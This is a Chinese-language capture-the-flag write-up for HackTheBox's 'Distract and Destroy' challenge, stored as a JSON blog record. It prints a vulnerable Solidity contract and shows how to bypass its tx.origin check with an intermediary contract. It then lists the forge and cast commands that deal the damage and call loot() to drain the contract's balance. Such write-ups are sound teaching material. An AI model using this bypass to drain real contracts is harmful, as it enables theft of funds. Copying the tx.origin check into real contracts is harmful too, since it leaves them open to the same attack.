{
  "id": 1760067324504,
  "title": "HackTheBox Distract and Destroy",
  "slug": "htb-distract-and-destroy",
  "date": "2025-03-03",
  "isEncrypted": false,
  "html": "<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1737445432390-46e77014-cfd2-459f-aa41-434af7c0bbd9.png\" alt=\"\"></p>\n<p>（本篇都是使用的 foundry 框架的工具进行交互）</p>\n<p>看看附件，主要是Creature.sol</p>\n<p>最先看到的是创建了一个有 1000 血量的 boss，，可以用 attack 方法攻击，但是后面有一些验证</p>\n<pre><code class=\"language-shell\">// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ncontract Creature {\n    uint256 public lifePoints;\n    address public aggro;\n\n    constructor() payable {\n        lifePoints = 1000;\n    }\n\n    function attack(uint256 _damage) external {\n        if (aggro == address(0)) {\n            aggro = msg.sender;\n        }\n\n        if (_isOffBalance() &amp;&amp; aggro != msg.sender) {\n            lifePoints -= _damage;\n        } else {\n            lifePoints -= 0;\n        }\n    }\n\n    function loot() external {\n        require(lifePoints == 0, &quot;Creature is still alive!&quot;);\n        payable(msg.sender).transfer(address(this).balance);\n    }\n\n    function _isOffBalance() private view returns (bool) {\n        return tx.origin != msg.sender;\n    }\n}\n</code></pre>\n<p>我们直接用attack(uint256)传入 1000 来攻击，就会发现攻击并没有生效，我们无法使用 loot() 来提取战利品</p>\n<pre><code class=\"language-shell\">cast send $TargetAddress &quot;attack(uint256)&quot; 1000 --rpc-url http:/ip/rpc --interactive\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1737446802792-9fb80bfa-ca90-447e-964d-af2eae2158bd.png\" alt=\"\"></p>\n<p>回过来我们看合约，会发现最重要的验证是再 _isOffBalance()，需要tx.origin != msg.sender，然后再满足aggro != msg.sender</p>\n<p>tx.origin 为合约的最初调用者 msg.sender 为合约的直接调用者，这里我们部署一个中间人合约来调用 attack 就可以绕过；</p>\n<p>然后aggro 这里是记录了第一次攻击者的 address，而我们刚刚攻击记录了自己 address，接下来使用中间人合约攻击刚好绕过</p>\n<p>那么写一个Middleman 中间人合约，使用<font style=\"color:rgb(36, 36, 36);background-color:rgb(249, 249, 249);\">forge 部署</font></p>\n<pre><code class=\"language-shell\">// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ncontract Middleman {\n    address public target = 0x70B0317717F2A79CE9Fe3695f805d252C6283C38;\n\n    function attack(uint256 _damage) external {\n        (bool success, bytes memory result) = target.call(abi.encodeWithSignature(&quot;attack(uint256)&quot;, _damage));\n        require(success, string(result));\n    }\n}\n</code></pre>\n<p>可以先不加--broadcast 模拟一下。Deployed to 为Middleman 合约地址</p>\n<pre><code class=\"language-shell\">forge create ./Middleman.sol:Middleman --rpc-url http://ip/rpc --private-key $privatekey --no-cache --broadcast\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1737447764566-410feba7-345a-461d-81cf-31bfcfbd5010.png\" alt=\"\"></p>\n<p>部署好后，通过Middleman 合约再进行交互</p>\n<pre><code class=\"language-shell\">cast send 0x05A97c857F07B6B1752A08C281a5303eA242FeB8 &quot;attack(uint256)&quot; 1000 --rpc-url http://ip/rpc --interactive\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1737448010495-a44142bb-c6c7-4309-9bd1-906dd99a0f5a.png\" alt=\"\"></p>\n<p>然后与目标合约交互用loot()提取战利品</p>\n<pre><code class=\"language-shell\">cast send $TargetAddress &quot;loot()&quot; --rpc-url http://ip/rpc --interactive\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1737448082752-d9024a28-d876-46f7-93d8-4bd9ae961904.png\" alt=\"\"></p>\n<p>最后来到 ip/flag 就能看到 flag 了</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1737448171401-e3e7272b-b6a0-47fc-a627-9a4bada58c26.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1737448130851-cc447eab-6083-4992-9b7c-3e565621f777.png\" alt=\"\"></p>\n"
}